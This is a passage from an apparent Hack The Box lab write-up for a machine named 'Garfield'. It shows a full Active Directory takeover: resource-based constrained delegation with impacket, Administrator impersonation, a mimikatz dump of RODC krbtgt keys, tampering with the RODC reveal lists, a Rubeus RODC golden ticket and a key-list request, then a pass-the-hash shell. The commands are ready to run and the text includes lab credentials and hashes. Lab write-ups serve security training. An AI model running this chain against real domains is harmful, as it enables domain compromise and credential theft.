0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-2502726253-3859040611-225969357-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: JJ
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=garfield,DC=htb
objectClass: top; person; organizationalPerson; user; computer
objectGUID: 280aaabd-fc02-42d4-b06d-88602383ee4f
objectSid: S-1-5-21-2502726253-3859040611-225969357-10601
primaryGroupID: 515
pwdLastSet: 1601-01-01 00:00:00+00:00
sAMAccountName: JJ$
sAMAccountType: 805306369
uSNChanged: 155940
uSNCreated: 155936
userAccountControl: WORKSTATION_TRUST_ACCOUNT
whenChanged: 2026-04-06 18:33:28+00:00
whenCreated: 2026-04-06 18:33:26+00:00
```


```
impacket-rbcd -delegate-to 'RODC01$' -delegate-from 'JJ$' -action write 'garfield.htb/l.wilson_adm:Password123!' -dc-ip 192.168.100.2
```
we will allow out machine to delegate on RODC01
and we will now get service ticket so we can impersonate the admin 
```
impacket-getST -spn cifs/RODC01.garfield.htb -impersonate Administrator garfield.htb/JJ\$:'Zhaha123!' -dc-ip 10.129.244.207
```
```
export KRB5CCNAME='/root/Desktop/HTB/S10/Garfield/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache'
```
now lets connect 
```
impacket-psexec -k -no-pass RODC01.garfield.htb
```
we will use mimikatz for hash dump 
```
mimikatz lsadump::lsa /inject /name:krbtgt_8245

Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357

RID  : 00000643 (1603)
User : krbtgt_8245

 * Primary
    NTLM : 445aa4221e751da37a10241d962780e2
    LM   : 
  Hash NTLM: 445aa4221e751da37a10241d962780e2
    ntlm- 0: 445aa4221e751da37a10241d962780e2
    lm  - 0: 0ab3d34a182bb016fc4cfd26544a9f16

 * WDigest
    01  6d31d1f92ef6d85f5517944f98bf5753
    02  8c46bd5ddc680291e70800990dbc02e3
    03  9ffbc24f29b9bb3df3c32b76631ff874
    04  6d31d1f92ef6d85f5517944f98bf5753
    05  8c46bd5ddc680291e70800990dbc02e3
    06  8fc97c500bf9c7c4a0d34a497f9c5245
    07  6d31d1f92ef6d85f5517944f98bf5753
    08  c4bac61b7ecb407d358f836d2f4e19c6
    09  c4bac61b7ecb407d358f836d2f4e19c6
    10  d8938c80e1e0c80a2ec1d8b06f42cb31
    11  67f002aa49f4400fa970a53e294f4bee
    12  c4bac61b7ecb407d358f836d2f4e19c6
    13  56062e2db43bc0069deb86de87509ca6
    14  67f002aa49f4400fa970a53e294f4bee
    15  7250fcfc09d9cb93345c0c1393e19e52
    16  7250fcfc09d9cb93345c0c1393e19e52
    17  04b30cd8b5381d4b8458b0c996503a91
    18  b48bda9ef98982d5ee33766a74880e01
    19  bb365cf4f0bcdadf35b6a9b04c58257b
    20  85addbd6d603cca1b500f2da02b205d0
    21  b6186618611e202aae4141716e6603f5
    22  b6186618611e202aae4141716e6603f5
    23  f3f6c9408db132bf8e59413b7b40bb16
    24  0acf88cc5cb3b35888708ebefe658b6f
    25  0acf88cc5cb3b35888708ebefe658b6f
    26  08b8941632a5017e7178a3761dfaf7fb
    27  c1b2fd89d0dafb5f9e18147042bdc433
    28  712f0b6ed3b7eb7f6f135a1e298c4e09
    29  bf8d51270f7f657079bb9744446d70cb

 * Kerberos
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Credentials
      des_cbc_md5       : d540fe6192b9ecfe

 * Kerberos-Newer-Keys
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
      aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
      des_cbc_md5       (4096) : d540fe6192b9ecfe

 * NTLM-Strong-NTOWF
    Random Value : f4b51c2c0d006172304e31dbc6e0de6b
```

```powershell
# Add Administrator to allowed replication group
Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" `
  -Add @{'msDS-RevealOnDemandGroup'='CN=Administrator,CN=Users,DC=garfield,DC=htb'}

# Clear ALL NeverRevealGroup entrie*s
# (Administrator is member of Administrators group which was in NeverRevealGroup)
Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" `
  -Clear "msDS-NeverRevealGroup"

# Verify
Get-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" `
  -Properties msDS-NeverRevealGroup | Select-Object -ExpandProperty "msDS-NeverRevealGroup"
# (empty — confirmed)
```
this will make all groups come in msDS-RevealOnDemandGroup and empty the msDS-NeverRevealGroup
then we will run rubues with the AES-256 hash as the DC only accept AES-256 hash not NTLM 
```
.\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357
```

now lets use this kirbi to get admin hash 
```
.\Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:ticket_2026_05_09_19_59_04_Administrator_to_krbtgt@GARFIELD.HTB.kirbi /nowrap
```

![[Pasted image 20260510140620.png]]

```
impacket-wmiexec 'garfield.htb/administrator@10.129.244.207' -hashes ':ee238f6debc752010428f20875b092d5'
```

and we got the root flag